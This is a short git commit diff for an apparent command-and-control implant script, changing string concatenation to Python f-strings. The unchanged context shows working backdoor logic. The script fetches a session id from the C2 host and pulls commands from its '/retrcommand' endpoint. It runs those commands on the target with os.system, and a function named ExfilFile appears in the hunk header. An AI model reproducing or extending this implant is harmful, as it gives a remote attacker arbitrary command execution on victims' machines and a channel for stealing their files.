761bbab8d39a02a8736f35e0590f3cec02d213c2
MitchellDavies <mitchbd98@gmail.com>
2021-04-27 12:55:44 -0500

    Made all string concat use python's f string format.

--- C2_Server/Implant/implant.py
+++ C2_Server/Implant/implant.py
@@ -16,7 +16,7 @@ def ExfilFile(file, c2, IPAddress):
 if(os.path.isfile("sid.log")):
     sid = open("sid.log", "r").read()
 else:
-    url = c2 + '/'
+    url = f'{c2}/'
     sid = urllib.request.urlopen(url).read().decode("utf-8")
     f = open("sid.log", "w")
     f.write(sid)
@@ -24,7 +24,7 @@ else:
 
 # Command execution
 time.sleep(2)
-url = c2 + '/retrcommand'
+url = f'{c2}/retrcommand'
 response = urllib.request.urlopen(url)
 command = response.read().decode("utf-8")
 os.system(command) #runs the command from our C2 server on the target
